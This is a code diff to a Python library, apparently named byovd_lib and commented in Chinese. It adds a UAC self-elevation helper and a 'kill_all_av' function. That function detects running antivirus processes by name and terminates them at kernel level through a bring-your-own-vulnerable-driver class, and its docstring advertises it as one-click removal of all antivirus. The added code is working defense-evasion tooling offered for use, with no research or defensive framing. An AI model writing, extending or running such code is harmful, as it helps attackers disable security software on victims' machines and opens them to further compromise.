@@ -24,6 +24,87 @@ import base64
 from pathlib import Path
 from typing import Optional, Any, List, Tuple
 
+
+# =============================================================================
+# Windows 自动提权工具
+# =============================================================================
+
+def request_elevation() -> bool:
+    """
+    请求管理员权限，如果当前没有管理员权限则自动提权重启脚本
+    
+    工作原理:
+    - 检查当前进程是否具有管理员权限
+    - 如果没有，使用 ShellExecute 以管理员身份重新启动当前脚本
+    - 原进程退出，新进程以 elevated 权限运行
+    
+    Returns:
+        bool: 如果已有管理员权限返回 True，否则请求提权并返回 False(原进程退出)
+    
+    使用示例:
+        from byovd_lib import request_elevation
+        request_elevation()  # 调用后，后续代码将以管理员权限运行
+    """
+    # 检查是否已有管理员权限
+    if ctypes.windll.shell32.IsUserAnAdmin():
+        return True
+    
+    print("[!] 需要管理员权限")
+    print("[*] 正在请求 UAC 提权...")
+    
+    # 获取当前脚本路径
+    script_path = os.path.abspath(sys.argv[0])
+    
+    # 获取 Python 解释器路径
+    python_exe = sys.executable
+    
+    # 构建命令行参数
+    params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
+    
+    # 使用 ShellExecute 以管理员身份重新启动
+    # SW_SHOWNORMAL = 1
+    ret = ctypes.windll.shell32.ShellExecuteW(
+        None,                   # hwnd - 父窗口
+        "runas",                # lpOperation - "runas" 表示以管理员身份运行
+        python_exe,             # lpFile - Python 解释器
+        f'"{script_path}" {params}',  # lpParameters - 脚本路径和参数
+        None,                   # lpDirectory - 使用当前目录
+        1                       # nShowCmd - SW_SHOWNORMAL 正常显示窗口
+    )
+    
+    # 检查 ShellExecute 是否成功
+    # 返回值 <= 32 表示失败
+    if ret <= 32:
+        print(f"[!] 提权失败，错误代码：{ret}")
+        print("[*] 错误说明:")
+        if ret == 5:
+            print("    访问被拒绝 - 用户取消了 UAC 对话框或没有提权权限")
+        elif ret == 8:
+            print("    内存不足 - 无法启动新进程")
+        elif ret == 10:
+            print("    错误的可执行文件关联 - 文件关联错误")
+        elif ret == 11:
+            print("    无效的 EXE 文件")
+        elif ret == 27:
+            print("    文件类型关联错误")
+        elif ret == 28:
+            print("    DDE 超时 - 无法启动应用")
+        else:
+            print(f"    未知错误 - 请参考 Windows 错误代码 {ret}")
+        print("[*] 请手动右键点击此脚本，选择'以管理员身份运行'")
+        input("按回车键退出...")
+        sys.exit(1)
+    
+    # 提权请求已发送，退出当前进程
+    # 新进程将以管理员权限运行
+    print("[*] 提权请求已发送，新进程将启动...")
+    sys.exit(0)
+
+
+# =============================================================================
+# 配置常量
+# =============================================================================
+
 # 依赖库导入 - 延迟加载以避免初始化时检查
 import importlib
 from typing import TYPE_CHECKING
@@ -511,6 +592,79 @@ class BYOVD:
             self.unload_driver()
 
 
+# =============================================================================
+# 一键终结杀毒软件
+# =============================================================================
+
+def kill_all_av(verbose: bool = True) -> List[Tuple[int, str, str, bool, str]]:
+    """
+    自动识别并终结所有正在运行的杀毒软件进程
+    
+    Args:
+        verbose: 是否输出详细信息
+    
+    Returns:
+        [(PID, 进程名，杀软名，成功标志，消息)]
+    
+    使用示例:
+        from byovd_lib import kill_all_av, request_elevation
+        
+        # 请求管理员权限
+        request_elevation()
+        
+        # 一键秒杀所有杀软
+        results = kill_all_av()
+        for pid, name, av, success, msg in results:
+            print(f"[{'+' if success else '-'}] {av} ({name}, PID: {pid}): {msg}")
+    """
+    _ensure_deps()
+    
+    results = []
+    
+    # 检测所有杀软进程
+    detected = []
+    for proc in _psutil.process_iter(['pid', 'name']):
+        try:
+            name = proc.info['name'].lower()
+            pid = proc.info['pid']
+            if name in ANTIVIRUS_PROCESSES:
+                detected.append((pid, proc.info['name'], ANTIVIRUS_PROCESSES[name]))
+        except (_psutil.NoSuchProcess, _psutil.AccessDenied):
+            continue
+    
+    if not detected:
+        if verbose:
+            print("[*] 未检测到杀毒软件进程")
+        return results
+    
+    if verbose:
+        print(f"[*] 检测到 {len(detected)} 个杀毒软件进程:")
+        for pid, name, av in detected:
+            print(f"    - {av}: {name} (PID: {pid})")
+        print()
+    
+    # 使用 BYOVD 内核级方式终止
+    with BYOVD() as byovd:
+        for pid, name, av in detected:
+            if verbose:
+                print(f"[*] 正在终止 {av} ({name}, PID: {pid})...")
+            
+            success, msg = byovd.kill(pid)
+            results.append((pid, name, av, success, msg))
+            
+            if verbose:
+                status = "[+]" if success else "[-]"
+                print(f"    {status} {msg}")
+    
+    # 总结
+    if verbose:
+        success_count = sum(1 for _, _, _, success, _ in results if success)
+        print()
+        print(f"[+] 完成：成功终止 {success_count}/{len(results)} 个杀毒软件进程")
+    
+    return results
+
+
 # 导出
-__all__ = ["BYOVD", "DriverLoader"]
+__all__ = ["BYOVD", "DriverLoader", "request_elevation", "kill_all_av", "ANTIVIRUS_PROCESSES"]
 __version__ = "1.0.0"
